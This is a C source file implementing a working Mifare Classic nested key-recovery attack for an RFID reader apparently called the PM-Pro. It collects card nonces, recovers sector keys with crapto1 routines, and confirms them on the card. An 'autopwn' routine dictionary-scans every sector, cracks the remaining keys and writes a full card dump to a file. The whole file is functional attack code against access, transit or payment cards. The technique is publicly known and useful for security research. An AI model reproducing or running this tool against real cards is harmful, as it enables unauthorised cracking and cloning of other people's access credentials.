/* nested.c — Mifare nested key recovery for the PM-Pro.
 *
 * Collection: device cmd 14 (foothold sector with a known key -> target sector),
 * returning 15 foothold nonce pairs + 8 target {nt, NtEnc, parity} records.
 * Recovery: the open-source crapto1 algorithm in src/crypto1.c (cr1_*), NOT the
 * obfuscated native .fr. Candidates are confirmed on the card via cmd 13, so a
 * recovered key is always real.
 *
 * Decrypted cmd 14 payload layout (empirically validated against the fob):
 *   [0..12]   header: uid(4) + 04 00 + keytype(60/61) + 00 01 + 00 00 00 00
 *   [13..132] 15 x 8-byte foothold nonce pairs (A,B), little-endian
 *   [133..]   8 x 11-byte target records: nt(4 LE) NtEnc(4 LE) parity(3)
 *   NOTE: the cipher authuid is big-endian (the real UID); nonces are LE.
 */
#include "nested.h"
#include "session.h"
#include "furui.h"
#include "crack.h"
#include "crypto1.h"
#include "protocol.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define TOLERANCE 32
#define FH_OFF    13
#define TGT_OFF   133

static int oddpar(uint8_t b) { return __builtin_parity(b) ^ 1; }
#ifndef BIT
#define BIT(x, n) (((x) >> (n)) & 1)
#endif

/* mfoc's parity filter. */
static int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, const uint8_t *par)
{
    return ((oddpar((Nt >> 24) & 0xFF) == (int)((par[0]) ^ oddpar((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) &
            (oddpar((Nt >> 16) & 0xFF) == (int)((par[1]) ^ oddpar((NtEnc >> 16) & 0xFF) ^ BIT(Ks1, 8))) &
            (oddpar((Nt >> 8)  & 0xFF) == (int)((par[2]) ^ oddpar((NtEnc >> 8)  & 0xFF) ^ BIT(Ks1, 0)))) ? 1 : 0;
}

static uint32_t le32(const uint8_t *p)
{ return (uint32_t)p[3] << 24 | (uint32_t)p[2] << 16 | (uint32_t)p[1] << 8 | p[0]; }
static uint32_t be32(const uint8_t *p)
{ return (uint32_t)p[0] << 24 | (uint32_t)p[1] << 16 | (uint32_t)p[2] << 8 | p[3]; }
static int cmp_u64(const void *a, const void *b)
{ uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b; return (x > y) - (x < y); }
static int cmp_int_desc(const void *a, const void *b) { return *(const int *)b - *(const int *)a; }

/* cmd 14 is intermittent (the card must be freshly selected) — retry. */
static size_t collect_nested(pmpro_dev *dev, uint8_t fblock, uint8_t ftype,
                             const uint8_t fkey[6], uint8_t tblock, uint8_t ttype,
                             uint8_t *out, size_t cap)
{
    uint8_t a10[1] = {0x10}, resp[FURUI_MAXMSG];
    uint8_t p[15] = {0x14, fblock, ftype, 0,0,0,0,0,0, tblock, ttype, 0,0,0,0};
    memcpy(p + 3, fkey, 6);
    size_t r = 0;
    for (int attempt = 0; attempt < 25; attempt++) {
        furui_exec(dev, a10, 1, resp, sizeof resp, 2000);
        r = furui_exec(dev, p, 15, resp, sizeof resp, 8000);
        if (r >= 6 && resp[2] == 1) break;
        r = 0;
    }
    if (!r) return 0;
    size_t dlen = 240 < cap ? 240 : cap;             /* incl. RC4 padding */
    memcpy(out, resp + 3, dlen);
    return dlen;
}

/* One batch: collect, recover candidates, confirm the most frequent on the card
 * via cmd 13. Returns 1 + found[6] if a key confirms, 0 if not, -1 on collect
 * failure. */
static int nested_batch(pmpro_dev *dev, uint8_t fblock, uint8_t ftype, const uint8_t fkey[6],
                        uint8_t tblock, uint8_t ttype, uint8_t found[6])
{
    uint8_t data[512];
    size_t n = collect_nested(dev, fblock, ftype, fkey, tblock, ttype, data, sizeof data);
    if (n < TGT_OFF + 8 * 11)
        return -1;

    uint32_t uid = be32(data);

    /* foothold nonce pairs -> distances -> median (the card's auth timing) */
    int dist[15], nd = 0;
    for (int i = 0; i < 15; i++) {
        uint32_t A = le32(data + FH_OFF + i * 8), B = le32(data + FH_OFF + i * 8 + 4);
        if (A == 0 && B == 0) continue;
        int d = cr1_nonce_distance(A, B);
        if (d >= 0) dist[nd++] = d;
    }
    if (nd == 0) return 0;
    qsort(dist, nd, sizeof(int), cmp_int_desc);
    int median = dist[nd / 2];

    /* recover candidate keys from each target nonce */
    uint64_t *keys = NULL;
    size_t nkeys = 0, kcap = 0;
    for (int rec = 0; rec < 8; rec++) {
        const uint8_t *r = data + TGT_OFF + rec * 11;
        uint32_t nt = le32(r), NtEnc = le32(r + 4);
        uint8_t par[3] = { r[8], r[9], r[10] };
        /* probe window [median-TOLERANCE, median+TOLERANCE], clamped at 0:
         * a negative start would wrap the uint32 step count and spin. */
        int mstart = median - TOLERANCE < 0 ? 0 : median - TOLERANCE;
        uint32_t NtProbe = cr1_prng_successor(nt, (uint32_t)mstart);
        for (int m = mstart; m <= median + TOLERANCE; m += 2,
             NtProbe = cr1_prng_successor(NtProbe, 2)) {
            uint32_t Ks1 = NtEnc ^ NtProbe;
            if (!valid_nonce(NtProbe, NtEnc, Ks1, par)) continue;
            uint32_t ncand = 0;
            uint64_t *cands = cr1_lfsr_recovery32(Ks1, NtProbe ^ uid, &ncand);
            if (!cands) continue;
            for (uint32_t c = 0; c < ncand; c++) {
                /* recovery returns the post-clock state's key; roll back the fed
                 * word (NtProbe^uid) to get the actual sector key. */
                Crypto1State st;
                cr1_init(&st, cands[c]);
                cr1_rollback_word(&st, NtProbe ^ uid, 0);
                uint64_t lfsr = cr1_state_to_key(&st);
                if (nkeys == kcap) {
                    size_t ncap = kcap ? kcap * 2 : 1 << 18;
                    uint64_t *nk = realloc(keys, ncap * sizeof *keys);
                    if (!nk) { free(keys); free(cands); return 0; }
                    keys = nk; kcap = ncap;
                }
                keys[nkeys++] = lfsr;
            }
            free(cands);
        }
    }
    if (nkeys == 0) { free(keys); return 0; }

    /* the true key recurs across records -> rank by frequency, keep the top */
    qsort(keys, nkeys, sizeof *keys, cmp_u64);
    typedef struct { uint64_t k; int c; } KC;
    static KC top[512];
    int nt_top = 0;
    for (size_t i = 0; i < nkeys;) {
        size_t j = i; while (j < nkeys && keys[j] == keys[i]) j++;
        int c = (int)(j - i);
        if (nt_top < 512) { top[nt_top].k = keys[i]; top[nt_top].c = c; nt_top++; }
        else { int w = 0; for (int t = 1; t < nt_top; t++) if (top[t].c < top[w].c) w = t;
               if (c > top[w].c) { top[w].k = keys[i]; top[w].c = c; } }
        i = j;
    }
    free(keys);
    for (int a = 0; a < nt_top; a++) for (int z = a + 1; z < nt_top; z++)
        if (top[z].c > top[a].c) { KC t = top[a]; top[a] = top[z]; top[z] = t; }

    /* confirm the most-frequent candidates on the card (cmd 13, chunks of 80) */
    for (int off = 0; off < nt_top; off += 80) {
        int cnt = nt_top - off < 80 ? nt_top - off : 80;
        uint8_t kl[80][6];
        for (int i = 0; i < cnt; i++)
            for (int by = 0; by < 6; by++) kl[i][by] = (uint8_t)(top[off + i].k >> ((5 - by) * 8));
        if (furui_check_keys(dev, tblock, ttype, kl, cnt, found))
            return 1;
    }
    return 0;
}

int furui_nested(pmpro_dev *dev, uint8_t fblock, uint8_t ftype, const uint8_t fkey[6],
                 uint8_t tblock, uint8_t ttype, uint8_t found[6], char *log, size_t lcap)
{
    int collected = 0;
    for (int b = 0; b < 10; b++) {
        int r = nested_batch(dev, fblock, ftype, fkey, tblock, ttype, found);
        if (r == 1) {
            snprintf(log, lcap, "nested cracked key %c for block %d (batch %d)",
                     ttype ? 'B' : 'A', tblock, b + 1);
            return 1;
        }
        if (r >= 0) collected++;
    }
    snprintf(log, lcap, collected ? "no key after 10 batches (try again, or lift+replace the card)"
                                   : "cmd14 collection failed (wrong foothold key / no card)");
    return 0;
}

int furui_autopwn(pmpro_dev *dev, const char *mfd_path,
                  void (*prog)(const char *msg, void *u), void *u,
                  char *log, size_t lcap)
{
    char m[160];
    #define PROG(...) do { snprintf(m, sizeof m, __VA_ARGS__); if (prog) prog(m, u); } while (0)

    /* card size: read block 0's SAK (reliable) once a sector-0 key is known;
     * fall back to the cmd-21 ATQA, else assume 1K. */
    furui_hf_card card;
    if (!furui_read_hf(dev, &card)) { snprintf(log, lcap, "no card on reader"); return 0; }
    uint16_t atqa = card.tail_len >= 2 ? (card.tail[0] | (uint16_t)card.tail[1] << 8) : 0;
    int nsec = 16;
    uint8_t k0[6], b0[64];
    if (furui_dict_attack(dev, 0, 0, k0)) {
        furui_activate(dev);
        if (furui_read_sector(dev, 0, 1, k0, NULL, b0, sizeof b0) >= 16) {
            int s = 0;
            pmpro_card_type(b0[5], atqa, card.uid_len, &s);
            if (s > 0) nsec = s;
        }
    }
    int nblk = nsec <= 32 ? nsec * 4 : 32 * 4 + (nsec - 32) * 16;
    PROG("card UID %02x%02x%02x%02x, %s (%d sectors)", card.uid[0], card.uid[1],
         card.uid[2], card.uid[3], nsec == 16 ? "Mifare 1K" : "Mifare 4K", nsec);

    uint8_t keyA[40][6], keyB[40][6];
    int gotA[40] = {0}, gotB[40] = {0};
    /* sector S's first block (block addressing differs above sector 32 on 4K) */
    #define SBLK(s) ((s) < 32 ? (s) * 4 : 128 + ((s) - 32) * 16)

    /* 1) dictionary across all sectors (both key types) — finds footholds */
    PROG("dictionary scan…");
    for (int s = 0; s < nsec; s++) {
        if (furui_dict_attack(dev, (uint8_t)SBLK(s), 0, keyA[s])) gotA[s] = 1;
        if (furui_dict_attack(dev, (uint8_t)SBLK(s), 1, keyB[s])) gotB[s] = 1;
    }

    /* 2) nested-attack the unknown keys using any known sector as foothold */
    for (int s = 0; s < nsec; s++) {
        for (int t = 0; t < 2; t++) {
            int *g = t ? &gotB[s] : &gotA[s];
            if (*g) continue;
            /* find a foothold (a different sector with a known key A) */
            int fb = -1; uint8_t fk[6];
            for (int f = 0; f < nsec; f++) if (f != s && gotA[f]) { fb = SBLK(f); memcpy(fk, keyA[f], 6); break; }
            if (fb < 0) continue;
            uint8_t k[6]; char l[256];
            PROG("nested: sector %d key %c…", s, t ? 'B' : 'A');
            if (furui_nested(dev, (uint8_t)fb, 0, fk, (uint8_t)SBLK(s), (uint8_t)t, k, l, sizeof l)) {
                memcpy(t ? keyB[s] : keyA[s], k, 6);
                *g = 1;
                PROG("  sector %d key %c = %02x%02x%02x%02x%02x%02x", s, t ? 'B' : 'A',
                     k[0],k[1],k[2],k[3],k[4],k[5]);
            }
        }
    }

    /* 3) read every sector with a recovered key and assemble the dump */
    uint8_t img[256][16];
    memset(img, 0, sizeof img);
    int known = 0, readok = 0;
    for (int s = 0; s < nsec; s++) {
        int blocks = s < 32 ? 4 : 16;
        int base = SBLK(s);
        if (gotA[s] || gotB[s]) known++;
        uint8_t buf[256];
        size_t bl = 0;
        /* reads need a fresh activate and are intermittent — retry */
        /* cmd 17 addresses by SECTOR index (not block); img[] is block-indexed */
        for (int attempt = 0; attempt < 10 && bl < (size_t)blocks * 16; attempt++) {
            furui_activate(dev);
            if (gotA[s]) bl = furui_read_sector(dev, (uint8_t)s, 1, keyA[s], NULL, buf, sizeof buf);
            else if (gotB[s]) bl = furui_read_sector(dev, (uint8_t)s, 2, NULL, keyB[s], buf, sizeof buf);
        }
        if (bl >= (size_t)blocks * 16) { readok++;
            for (int b = 0; b < blocks; b++) memcpy(img[base + b], buf + b * 16, 16); }
        /* write recovered keys into the sector trailer */
        uint8_t *tr = img[base + blocks - 1];
        if (gotA[s]) memcpy(tr, keyA[s], 6);
        if (gotB[s]) memcpy(tr + 10, keyB[s], 6);
        if (tr[6] == 0 && tr[7] == 0 && tr[8] == 0) { tr[6]=0xFF; tr[7]=0x07; tr[8]=0x80; tr[9]=0x69; }
    }

    FILE *f = fopen(mfd_path, "wb");
    if (!f) { snprintf(log, lcap, "cannot write %s", mfd_path); return 0; }
    fwrite(img, 16, nblk, f);
    fclose(f);
    snprintf(log, lcap, "%d/%d sectors keyed, %d read — wrote %s (%d bytes)",
             known, nsec, readok, mfd_path, nblk * 16);
    return known > 0;
    #undef PROG
    #undef SBLK
}

int furui_nested_auto(pmpro_dev *dev, uint8_t tblock, uint8_t ttype,
                      uint8_t found[6], char *log, size_t lcap)
{
    /* find a foothold: a sector whose key the dictionary knows (mfoc-style). */
    uint8_t fkey[6]; int fblock = -1;
    for (int s = 0; s < 16; s++) {
        uint8_t blk = (uint8_t)(s * 4);
        if (blk == tblock) continue;
        if (furui_dict_attack(dev, blk, 0, fkey)) { fblock = blk; break; }
    }
    if (fblock < 0) {
        snprintf(log, lcap, "no foothold: no sector opens with a known/default key "
                 "(nested needs one). Try the dictionary, or a darkside-vulnerable card.");
        return 0;
    }
    return furui_nested(dev, (uint8_t)fblock, 0, fkey, tblock, ttype, found, log, lcap);
}
